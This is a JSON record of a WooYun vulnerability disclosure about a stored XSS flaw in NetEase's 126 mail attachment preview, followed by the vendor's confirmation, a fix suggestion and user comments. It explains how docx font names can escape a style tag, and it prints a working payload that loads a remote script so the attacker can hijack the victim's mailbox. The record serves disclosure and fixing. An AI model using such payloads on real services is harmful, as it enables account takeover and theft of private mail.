{"id": 46910, "wybug_id": "wooyun-2014-088920", "wybug_title": "126邮箱存储型XSS 可劫持他人账号进入对方邮箱", "wybug_corp": "网易", "wybug_author": "0x_Jin", "wybug_date": "2014-12-27 15:10", "wybug_open_date": "2015-02-10 15:12", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向公众公开  简要描述： 一步两步 一步两步～ 详细说明：  首先问题出在附件预览那(现在邮箱正文的过滤都过滤的差不多了)，附件预览那如果预览doc docx这种类型的文件 便会采用微软的在线预览技术(高清版)以及永中软件的预览技术(极速版)而微软的在线预览技术采用的是将内容嵌入到图片 然后来渲染出一张图片给用户看，这样是比较需要时间以及带宽来加载的(难怪叫高清版)但是永中软件的就相对正常一些了，是获得内容然后渲染到html，这样速度比较快，带宽也无需太多 就跟浏览网页一样。那么现在问题来了，微软的在线预览技术应该做的比较成熟了 所以直接放弃，那另外一个呢？发送一个docx 然后预览发现字体是会输出在style标签中字体里的。如果在字体中带上恶意payload呢？其实是会过滤的，如果直接闭合style标签会变成这样：</style><script> --->\\60;/style\\62;\\60;script\\62;把payload当成值给编码了，这样就过不去了么，No 好玩的来了。我们只需要有一个 ; 号 来结束掉 font-family 就ok了。那么便可以这样：}</style><script> 这样的话 } 会编码成font-family:\\125;这样我们就有了个;号 然后便可以写payload了最终payload如下 (由于字数问题 分成了两段):}</style><script src=//km3pw>}</script>把上面的两段设置到word文档中的字体里就好了比如 1.xsss --> 字体等于}</style><script src=//km3pw>        2.csrf  --> 字体等于}</script>\n\n\n\n然后发送给别人预览：\n\n\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤危险字符 关键cookie字段设置Httponly   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-12-30 12:17 厂商回复： 感谢您对网易的关注。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-27 15:12 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  摩擦 摩擦 在这光滑的地面摩擦    \n     2014-12-27 15:12 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  前排。    \n     2014-12-27 15:21 |    \t\t刺蝴蝶De箫启灵 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 我有一只小毛驴，我从来都不骑)\t\t \n  哇塞，，这个屌。。。。    \n     2014-12-30 15:16 |    \t\t冰糖flow \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:8        | 苟利国家生死已，谈笑风生又一年)\t\t \n  马克    \n     2015-01-29 17:38 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  jin牛你的简历侧漏了／／    \n     2015-01-29 18:30 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @残废 漏了就漏了吧 也没啥隐私 简历本身就是给人看的    \n     2015-01-29 19:00 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  见过这个思路，啦啦啦    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}